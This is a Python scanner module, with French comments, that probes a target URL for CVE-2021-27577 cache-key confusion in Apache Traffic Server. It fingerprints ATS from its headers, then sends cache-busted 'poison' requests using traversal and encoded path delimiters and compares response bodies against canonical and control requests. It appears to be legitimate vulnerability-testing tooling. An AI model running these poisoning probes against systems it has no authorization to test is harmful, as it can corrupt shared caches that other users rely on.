#!/usr/bin/env python3

"""
CVE-2021-27577 — Apache Traffic Server URL normalization / cache-key confusion.
Affecte : ATS 7.0.0-7.1.12, 8.0.0-8.1.1, 9.0.0-9.0.1
youst.in/posts/cache-poisoning-at-scale/

Réécriture body-based : on NE conclut PLUS à partir des headers de cache
(`X-Cache-Status`, `Age`, patterns hit/miss) — trop bruités et facilement
falsifiés. On compare les CORPS de réponse selon la méthodo cache-poisoning :

  1. requête « poison » d'abord, sur une variante de chemin (délimiteur qui
     atteint réellement le serveur : `//`, `/..;/`, `%2f`, `%23`…) avec un
     cache-buster frais -> si un MISS survient, le cache mémorise la réponse
     sous une clé potentiellement confondue ;
  2. requête PROPRE sur la forme canonique (même cb) ;
  3. requête de contrôle indépendante (cb différent) = baseline.

On signale un `behavior` seulement si la forme canonique renvoie soudainement
le corps de la variante empoisonnée ALORS QUE la baseline en diffère.

Note : la vraie variante « fragment » (`#`) nécessite d'injecter le `#` brut
dans la request-line via socket (requests le retire) et un ATS de test — non
automatisable de façon fiable ici. Ce module se limite donc aux délimiteurs
transmis par requests et rapporte un signal à vérifier manuellement, jamais un
faux « confirmed » issu des headers.
"""

from utils.style import Colors, Identify
from utils.utils import configure_logger, random, requests, string

logger = configure_logger(__name__)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

# Statuts sans intérêt pour une comparaison de corps.
SKIP_STATUS_CODES = {403, 429, 503}

# Délimiteurs de chemin qui ATTEIGNENT le serveur (contrairement au fragment `#`
# brut retiré par requests) et sur lesquels ATS a montré des normalisations
# divergentes entre clé de cache et résolution origine.
PATH_DELIMITERS = [
    "%23",       # '#' encodé -> confusion fragment côté ATS
    "//",        # double slash
    "/..;/",     # traversal + paramètre matrix
    "%2f..%2f",  # slash encodé + traversal
    "%00",       # null byte encodé
]


def _rand(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def detect_apache_traffic_server(
    url: str, s: requests.Session
) -> tuple[bool, str]:
    """Fingerprint ATS via les headers Server / Via / X-*-Cache (détection seule)."""
    try:
        response = s.get(url, timeout=10, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        logger.debug("ATS detection request failed: %s", e)
        return False, "request failed"

    server = response.headers.get("Server", "").lower()
    if "ats" in server or "apache traffic server" in server:
        return True, f"Server: {response.headers.get('Server')}"

    via = response.headers.get("Via", "").lower()
    if "ats" in via or "apache traffic server" in via:
        return True, f"Via: {response.headers.get('Via')}"

    for header in ("X-ATS-Cache-Status", "ATS-Internal", "X-Cache-Generation"):
        if header in response.headers:
            return True, f"ATS header: {header}"

    return False, "no ATS indicators"


def _get(uri: str, s: requests.Session, authent):
    return s.get(
        uri,
        verify=False,
        auth=authent,
        allow_redirects=False,
        timeout=10,
    )


def _test_delimiter(
    url: str,
    delimiter: str,
    s: requests.Session,
    authent: tuple[str, str] | None,
) -> bool:
    """
    Sonde un délimiteur. Retourne True si une confusion de cache est suspectée.
    """
    marker = _rand()
    base_path = f"/cptest_{marker}"
    cb = _rand()

    canonical = f"{url}{base_path}?cb={cb}"
    poison = f"{url}{base_path}{delimiter}?cb={cb}"

    try:
        # 1. Poison d'abord (le MISS mémorise la variante sous la clé confondue).
        r_poison = _get(poison, s, authent)
        # 2. Forme canonique propre, même cb.
        r_verify = _get(canonical, s, authent)
        # 3. Baseline de contrôle, cb indépendant.
        r_control = _get(f"{url}{base_path}?cb={_rand()}", s, authent)
    except requests.exceptions.RequestException as e:
        logger.debug("delimiter probe failed %s: %s", delimiter, e)
        return False

    if any(r.status_code in SKIP_STATUS_CODES for r in (r_poison, r_verify, r_control)):
        return False

    # Décision strictement body-based :
    # la canonique doit servir le corps du poison ET différer de la baseline.
    poisoned = (
        r_verify.content == r_poison.content
        and r_verify.content != r_control.content
        and r_verify.status_code == r_poison.status_code
    )

    if poisoned:
        print(
            f" {Identify.behavior} | CVE-2021-27577 | POSSIBLE CACHE-KEY CONFUSION"
            f" | {Colors.BLUE}{canonical}{Colors.RESET}"
            f" | delimiter: {delimiter!r}"
            f" | canonical={len(r_verify.content)}b poison={len(r_poison.content)}b"
            f" control={len(r_control.content)}b"
        )
        print(
            " └─ [i] Corps canonique aligné sur la variante empoisonnée."
            " Vérification manuelle requise (injection du fragment brut via"
            " socket contre l'ATS)."
        )
        return True

    return False


def apache_cp(
    url: str,
    authent: tuple[str, str] | None = None,
    s: requests.Session | None = None,
) -> bool:
    """
    Point d'entrée CVE-2021-27577.

    Args:
        url: URL cible
        authent: credentials HTTP Basic optionnels
        s: session partagée optionnelle (sinon une session éphémère est créée)

    Returns:
        True si une confusion de cache est suspectée (à vérifier manuellement).
    """
    own_session = s is None
    if own_session:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": DEFAULT_USER_AGENT})

    try:
        is_ats, ats_info = detect_apache_traffic_server(url, s)
        if not is_ats:
            return False

        print(f" ├── {Colors.GREEN}Apache Traffic Server detected{Colors.RESET} ({ats_info})")
        print(" ├── Testing cache-key confusion (body-based)...")

        detected = False
        for delimiter in PATH_DELIMITERS:
            if _test_delimiter(url, delimiter, s, authent):
                detected = True

        if not detected:
            logger.debug("no cache-key confusion detected on %s", url)
        return detected

    except requests.exceptions.RequestException as e:
        logger.error("error testing CVE-2021-27577 %s: %s", url, e)
        return False
    finally:
        if own_session:
            s.close()


if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Usage: python CVE202127577.py <URL>")
        sys.exit(1)

    apache_cp(sys.argv[1])
